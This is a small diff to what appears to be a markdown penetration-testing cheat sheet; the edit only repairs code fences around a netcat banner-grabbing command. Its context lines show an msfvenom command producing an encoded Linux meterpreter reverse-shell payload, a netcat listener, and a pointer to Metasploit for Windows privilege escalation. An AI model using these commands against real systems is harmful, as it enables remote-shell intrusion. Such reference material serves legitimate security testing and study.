@@ -120,9 +120,9 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f elf > en
 nc -lnvp <port>
 ```
 ## Banner Grabbing:
-``
+```
 nc -nv <ip> <port>
-``
+```
 ## Windows Privilege Esclations:
 ```
 # Windows kernel             ===> use suggester module in metasploit
